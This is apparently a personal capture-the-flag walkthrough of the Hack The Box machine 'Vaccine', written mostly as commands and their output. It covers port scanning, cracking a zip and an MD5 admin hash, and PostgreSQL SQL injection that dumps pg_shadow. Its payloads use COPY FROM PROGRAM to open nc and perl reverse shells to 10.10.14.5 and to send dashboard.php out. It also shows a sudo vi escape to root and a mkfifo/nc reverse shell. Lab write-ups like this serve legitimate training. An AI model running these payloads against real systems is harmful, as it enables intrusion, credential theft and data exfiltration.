`>> sudo nmap -p- --min-rate=1000 -sS -A -T4 10.10.10.46`  
	21/tcp open  ftp     vsftpd 3.0.3  
	22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)  
	| ssh-hostkey:   
	|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)  
	|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)  
	|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)  
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
	| http-cookie-flags:   
	|   /:   
	|     PHPSESSID:   
	|_      httponly flag not set  
	|_http-server-header: Apache/2.4.41 (Ubuntu)  
	|_http-title: MegaCorp Login  
  
`>> ssh: robert is not here, cannot ssh with his creds`  
`>> web: index is a login page`  
`>> python dirsearch/dirsearch.py -u http://10.10.10.46 -E`    
	[13:43:32] 403 -  276B  - /.htaccess-local                             
	[13:43:32] 403 -  276B  - /.htaccess-marco  
	[13:43:32] 403 -  276B  - /.htaccess-dev  
	[13:43:32] 403 -  276B  - /.htaccess.bak1    
	[13:43:32] 403 -  276B  - /.htaccess.old  
	[13:43:32] 403 -  276B  - /.htaccess.save  
	[13:43:32] 403 -  276B  - /.htaccessOLD2  
	[13:43:32] 403 -  276B  - /.htaccessOLD  
	[13:43:32] 403 -  276B  - /.htaccess.txt  
	[13:43:32] 403 -  276B  - /.htaccess.sample  
	[13:43:32] 403 -  276B  - /.htaccess.orig  
	[13:43:32] 403 -  276B  - /.htaccessBAK  
	[13:43:32] 403 -  276B  - /.htpasswd-old  
	[13:43:33] 403 -  276B  - /.httr-oauth  
	[13:43:38] 403 -  276B  - /.php                                        
	[13:44:32] 302 -  931B  - /dashboard.php  ->  index.php                        
	[13:44:51] 200 -    2KB - /index.php                          
	[13:44:52] 200 -    2KB - /index.php/login/  
	[13:44:57] 200 -    1KB - /license.txt                                                  
	[13:45:28] 403 -  276B  - /server-status                                               
	[13:45:28] 403 -  276B  - /server-status/  

`>> no passwords accepted, should bruteforce session id?`  

`>> ftp: may be the same as on previous machine`  
It is indeed  
`>> there is a backup file. With a password.`  
`>> fcrackzip -u -v -D -p '/usr/share/wordlists/rockyou.txt' backup.zip`  
	found file 'index.php', (size cp/uc   1201/  2594, flags 9, chk 5722)  
	found file 'style.css', (size cp/uc    986/  3274, flags 9, chk 989a)  


	PASSWORD FOUND!!!!: pw == 741852963  
`>> From index.php`
	if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")  

Time to dehash. No solt required.  
`>> hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt`  
	* Runtime...: 2 secs  

	2cb42f8734ea607eefed3b70af13bbd3:qwerty789  
	
	Use better passwords..  

`>> seems like nothing interestion in there... we are not the super admin yet. More like a content admin.`  

However, the serach field is interactive after some <$><\><"><?><'> we find out that we can do SQL injection in there!  
The original query is  
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^  

Let's make a new queries:  

1) Select * from cars where name ilike '%  
2) aaa' union all select null as int, version(), null as text, null as text, null as text union all select * from cars where name ilike 'aaa  
3) %';  

`>> aaa' union all select null as int, usename, passwd, null as text, null as text from pg_shadow union all select * from cars where name ilike 'aaa`  
postgres 	md52d58e0637ec1e94cdfba3d1c26b67d01  

aaa'; drop table if exists cmd_exec_541; create table cmd_exec_541(cmd_output text); copy cmd_exec_541 from program 'nc -e /bin/sh 10.10.14.5 4444 &'; select null as int, cmd_output, null as text, null as text, null as text from cmd_exec_541 union all select * from cars where name ilike 'aaa  

DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec_541(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"';  
SELECT * FROM cmd_exec;  

aaa'; drop table if exists cmd_exec_541; create table cmd_exec_541(cmd_output text); copy cmd_exec_541 from program 'cat /var/www/html/dashboard.php | nc 10.10.14.5 80'; select * from cars where name ilike 'aaa  


as we cannot get rid of 1 and 3, we need to try to make their results to be empty  
Impossibru to establish the reverse shell, but was able to send individual commands to my shell  

$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");  

The same password is ok for ssh apparently.  

`postgres@vaccine:~$ cat user.txt`  
139d3e5c3db18073d250ce0dccc43997  

Time to escalate  
https://payatu.com/guide-linux-privilege-escalation  

`netstat -antup`  
Any root owned listeners? No.  

`ps -aux | grep root`  
Interesting root processess?  
Apache and www are owned by root. Cannot write there.

`id`  
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)  

`find / -perm -u=s -type f 2>/dev/null`  
Any SUID executables?  

`sudo -l`  
What can user sudo to?  
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf 

Oh really?  
`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`  

`:!bash`  

`whoami`  
root   

`cat root.txt`  
dd6e058e814260bc70e9bbdef2715849  


PostEx  

Shell upgrade  
`SHELL=/bin/bash script -q /dev/null`  
`python3 -c "import pty; pty.spawn('/bin/bash')"`  

SQLi  
`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`  
`mkfifo 1474pipe`  
`cat 1474pipe | /bin/sh | nc 10.10.14.74 4444 | tee f`  
